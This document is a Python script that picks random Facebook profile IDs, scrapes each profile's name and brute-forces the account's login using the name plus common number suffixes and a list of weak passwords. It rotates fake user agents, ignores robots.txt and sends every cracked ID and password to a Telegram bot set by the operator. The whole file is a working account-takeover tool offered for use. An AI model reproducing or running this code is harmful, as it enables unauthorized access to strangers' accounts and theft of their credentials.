#Coding Bay issam ✓ 
import subprocess
import webbrowser
import requests 
from bs4 import BeautifulSoup as bs
import random
import mechanize
import user_agent
import sys
s = '\033[1;36m'
a = '\033[1;33m'
z = '\033[1;31m'
print(s+"------ xglle ------ ")
#webbrowser.open('https://youtube.com/@SV.2')
def brout(id,name,teleid,teletoken):
	password_list=['','12345','12345678','123456789','1234567890']
	for password in password_list:
		aaa=name+password
		Agent=user_agent.generate_user_agent()
		#print(Agent)
		url="https://www.facebook.com/login.php"
		fk="Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36"
		browser=mechanize.Browser()
		browser.set_handle_robots(False)
		browser.addheaders=[("User-Agent",Agent)]
		browser.open(url)
		browser.select_form(nr=0)
		browser.form["email"] = id
		browser.form["pass"] = aaa
		finall=browser.submit()
		respons=finall.geturl()
		if "save-device" in respons:
			print('-'*50)
			print('Hacked Id : '+id)
			print('Hacked Password : '+aaa)
			print('-'*50)
			yourcan=f"""
ID : {id}
Password : {aaa}

bay: @FS5_F
"""
			requests.get("https://api.telegram.org/bot"+teletoken+"/sendMessage?chat_id="+teleid+"&text="+yourcan)
		else:
			print(s+'Faild Password : ' + aaa)
	else:
		password_list=['12345','12345678','123456789','1234567890','19901990','19911991','19921992','19931993','19941994','19951995','19961996','19971997','19981998','19991999','1234512345','1234554321','1122334455','123456654321','11223344556677','1q2w3e4r5t','qqwweerr','12345@12345','12345@','20032003','ahmedahmed','youssefyoussef']
		for password in password_list:
			Agents=user_agent.generate_user_agent()
		#	print(Agent)
			url="https://www.facebook.com/login.php"
			fak="Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36"
			browser=mechanize.Browser()
			browser.set_handle_robots(False)
			browser.addheaders=[("User-Agent",Agents)]
			browser.open(url)
			browser.select_form(nr=0)
			browser.form["email"] = id
			browser.form["pass"] = password
			finall=browser.submit()
			respons=finall.geturl()
			if "save-device" in respons:
				print('-'*50)
				print('Hacked Id : '+id)
				print('Hacked Password : '+password)
				print('-'*50)
				yourcan=f"""
ID : {id}
Password : {aaa}

bay: @FS5_F
"""
				requests.get("https://api.telegram.org/bot"+teletoken+"/sendMessage?chat_id="+teleid+"&text="+yourcan)

			else:
				print(a+'Faild Password : ' + password)
			
		



	
	
def auto(teleid,teletoken):
	token=teletoken
	teleids=teleid
	Agent=user_agent.generate_user_agent()
	#print(Agent)
	headers={"User-Agent":'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'}
	num='1234567890'
	#1000
	d='1000'
	#30677888399
	idd=''.join(random.choice(num)for i in range(11))
	fin=d+idd
	URL = f"https://www.facebook.com/profile.php?id={fin}"
	r = requests.get(URL) 
	soup = bs(r.content, 'html.parser') # *
	name=soup.find('meta',{"name":"twitter:title"})
	uname=name["content"]
	if uname != '':
		print("-"*50)
		print('Target Name : '+uname)
		print('Target Id : '+fin)
		print("-"*50)
		name=uname.replace(' ','')
		brout(fin,name,teleids,token)
		
try:	
	teleid=input(z+'Please Enter The Telegram Id :')
	teletoken=input(s+'Please Enter The Token Bot : ')
except:
	sys.exit()
while True:
	try:
		auto(teleid,teletoken)
	except:
		print('*')





